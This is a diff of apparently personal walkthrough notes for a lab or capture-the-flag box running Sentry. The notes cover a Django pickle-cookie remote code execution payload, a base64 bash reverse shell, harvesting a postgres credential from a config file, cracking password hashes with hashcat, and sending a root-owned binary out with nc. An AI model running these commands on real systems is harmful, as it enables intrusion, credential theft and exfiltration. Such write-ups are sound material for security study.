@@ -62,7 +62,7 @@ newContent['testcookie'] = PickleRce()
 
 print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-echo 'bash -i >& /dev/tcp/<my ip>/<my port> 0>&1' | base64 -> <base64 code>
+echo -n 'bash -i >& /dev/tcp/<my ip>/<my port> 0>&1' | base64 -> <base64 code>
 SECRET_KEY <- system.secret-key, cookie <- sentrysid, sleep 30 <- echo '<base64 code>' | base64 -d | bash
 nc -nlvp <my port>
 python2 <code>.py -> copy and paste it in sentrysid within "" -> refresh
@@ -71,7 +71,18 @@ python3 -c 'import pty;pty.spawn("/bin/bash")';
 ctrl + z -> stty rows -echo; fg
 export TERM=xterm # Can clear the shell with ctrl + l
 
-find / -iname config.py 
+find / 2>/dev/null | grep conf -> /etc/sentry/sentry.conf.py -> postgres credential
+psql postgres://sentry:SentryPassword2021@localhost:5432/sentry
+\l: show databases
+\dt: show tables
+\d+ <table>: describe table
+\q: exit
+
+select username, first_name, password from auth_user; -> get karl's hash -> hashcat <karl hash> rockyou.txt -> get karl's password
+su karl
+sudo -l: Can run /root/.auth/authenticator -> send file: nc <my ip>:<myport> < /root/.auth/authenticator -> receive file: nc -nvlp <myport> > authenticator
+use ghidra 1.10.1 to open the file(Ver 1.11 also does not work well...)
+
 
 sudo apt update
 sudo apt install -y build-essential libssl-dev zlib1g-dev libncurses5-dev \
